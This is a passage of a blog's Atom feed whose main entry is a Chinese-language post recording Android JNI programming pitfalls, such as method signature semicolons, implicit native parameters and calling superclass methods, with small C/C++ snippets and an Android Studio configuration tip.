        &lt;h3 id=&quot;先说两句&quot;&gt;&lt;a href=&quot;#先说两句&quot; class=&quot;headerlink&quot; title=&quot;先说两句&quot;&gt;&lt;/a&gt;先说两句&lt;/h3&gt;&lt;p&gt;前不久IDA7.0发布，这次相较之前来说有很多的改动，首先整个IDA是x86 64位架构，而之前却一直是i386 32位，因
      
    
    </summary>
    
      <category term="IDA" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IDA/"/>
    
    
      <category term="ida" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ida/"/>
    
  </entry>
  
  <entry>
    <title>Android JNI踩坑笔记</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/28/Android_JNI_%E6%8E%89%E5%9D%91%E7%AC%94%E8%AE%B0%20/JNI/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/28/Android_JNI_掉坑笔记 /JNI/</id>
    <published>2017-11-28T09:00:20.000Z</published>
    <updated>2017-11-29T03:29:43.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><blockquote><p>最近项目需要用到jni去实现一些功能，在原生层调用java层的过程中，踩了很多坑，这里做个记录，方便以后查阅，以及如果遇到一些错误，看看有没有这里的坑。</p></blockquote></blockquote><h3 id="坑1–jni方法签名分号问题"><a href="#坑1–jni方法签名分号问题" class="headerlink" title="坑1–jni方法签名分号问题"></a>坑1–jni方法签名分号问题</h3><p>这是一个很常见的问题，第一次写jni中方法签名的时候很容易遇到这个错误，比如下面这个签名</p><pre><code class="c++">jmethodID equals_id = env-&gt;GetMethodID(string_c, &quot;equals&quot;, &quot;(Ljava/lang/Object;)Z&quot;);</code></pre><p>切记当参数或者返回值不是基本类型的时候一定要在末尾加上分号。</p><pre><code class="c++">jmethodID iterator_id = env-&gt;GetMethodID(list_c,&quot;iterator&quot;,&quot;()Ljava/util/Iterator;&quot;);</code></pre><p>这类错误常见描述为方法找不到错误。如果遇到类方法找不到切记先检查方法签名是否正确。</p><h3 id="坑2–原生方法包含默认2个参数"><a href="#坑2–原生方法包含默认2个参数" class="headerlink" title="坑2–原生方法包含默认2个参数"></a>坑2–原生方法包含默认2个参数</h3><p>这个坑当然是对jni使用不熟练造成的，未了解其特性，所以对于初学者来说容易犯。看一个原生函数</p><pre><code class="c++">static jboolean nativeFunction(JNIEnv *env, jobject content, jobject someObj){...}</code></pre><p>第一个保留参数为<code>JNIEnv</code>虚拟机环境变量，第二个为调用该原生方法的java类对象即上下文。这里多说一句，第二个参数的上下文需根据该方法为静态方法还是实例方法，若为静态方法，则这里上下文为类引用；若为实例方法，则上下文为该类的对象引用。若把类引用当做对象引用，在查找方法id时则会出现方法找不到错误。</p><p>由于很多时候不声明这两个参数同样能正确运行（无其他参数时）导致忽略了第二个参数的存在，以为第二个上下文参数为传入的对象引用。</p><p>这类错误常见描述为当你在某处调用这个对象的方法时，会提示找不到该方法。因为这个对象根本不是你传入的对象。</p><h3 id="坑3—jni调用父类方法的正确姿势"><a href="#坑3—jni调用父类方法的正确姿势" class="headerlink" title="坑3—jni调用父类方法的正确姿势"></a>坑3—jni调用父类方法的正确姿势</h3><p>这里就以一个正确的调用父类方法的流程来讲，起因是当我在查找<code>Exception</code>这个类的<code>getStackTrace</code></p><p>方法时提示方法找不到错误，调了会才发现这个方法是在其父类<code>Throwable</code>中，所以正确的写法为：</p><pre><code class="c++">    jclass exception_c = env-&gt;FindClass(&quot;java/lang/Exception&quot;);    jclass throwable_c = env-&gt;FindClass(&quot;java/lang/Throwable&quot;);    jmethodID getStackTrace_id = env-&gt;GetMethodID(throwable_c, &quot;getStackTrace&quot;,&quot;()[Ljava/lang/StackTraceElement;&quot;);</code></pre><p>那么怎么调用呢？用<code>CallNonvirtual&lt;XXX&gt;Method</code>去调用父类中的方法，一个调用例子：</p><pre><code class="c++">jobjectArray stes = (jobjectArray)env-&gt;CallNonvirtualObjectMethod(excep, throwable_c, getStackTrace_id);</code></pre><p>这里需要传入三个参数，第一个为子类的对象引用，第二个为父类类引用，第三个为方法id。</p><h3 id="坑4—其他小坑"><a href="#坑4—其他小坑" class="headerlink" title="坑4—其他小坑"></a>坑4—其他小坑</h3><p>写jni代码时最大的麻烦在于要写很多代码去定位java中的类和方法，java中一个很简单的调用，在jni层写时或许要写很大一堆，这也不奇怪，因为没有了Android虚拟机，这些本来由虚拟机做的事必须得手动去完成。在写jni层代码时，还有一些小的错误，比如<code>jstring</code>与<code>char*</code>的转换，<code>LOGE()</code>函数中参数为<code>char*</code>的字符串。当然还有一些java与C语言类型对应的问题就不多说了，自己翻下<code>jni.h</code>头文件就能找到。</p><p>还有个AndroidStudio的bug在于不能正确的解析jni等头文件，虽然不影响编译，但没有了代码提示以及显示红色看着也挺难受的。网上找到一个解决办法，在对应的<code>build.gradle</code>文件中在<code>defaultConfig{}</code>加入下面的脚本：</p><pre><code class="c">        sourceSets.main{            jni.srcDirs  &#39;/Users/king/Android/sdk/ndk-bundle/platforms/android-19/arch-mips/usr/include&#39;            jniLibs.srcDir &#39;/Users/king/Android/sdk/ndk-bundle/platforms/android-19/arch-arm/usr/lib&#39;        }</code></pre><p>无非是手动指定了jni相关的文件路径。</p><p>关于下面两类写法：</p><pre><code class="c++">jclass exception_c = env-&gt;FindClass(&quot;java/lang/Exception&quot;);</code></pre><pre><code class="c">jclass exception_c = (*env)-&gt;FindClass(env, &quot;java/lang/Exception&quot;);</code></pre><p>原因在于C++和C的两种写法，可以在文件中宏定义为C++的即可。</p><h3 id="完"><a href="#完" class="headerlink" title="完"></a>完</h3><p>说了这些坑，当然我都踩过，由于刚接触Android jni特性。所以踩了很多坑，尤其是Android不像iOS那样容易debug，多了一层虚拟机导致很多错误不好调式。说到这，还要吐槽下AndroidStudio的gradle这个项目管理器，各种版本或者莫名奇怪的错误，虽然Xcode同样不是很好用，但相比之下，Xcode省心多了。</p><p>继续踩坑去了…</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;最近项目需要用到jni去实现一些功能，在原生层调用java层的过程中，踩了很多坑，这里做个记录，方便以后查阅，以及如果遇到一些错误，看看有没有这里的坑。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;h
      
    
    </summary>
    
    
      <category term="android" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/android/"/>
    
  </entry>
  
</feed>
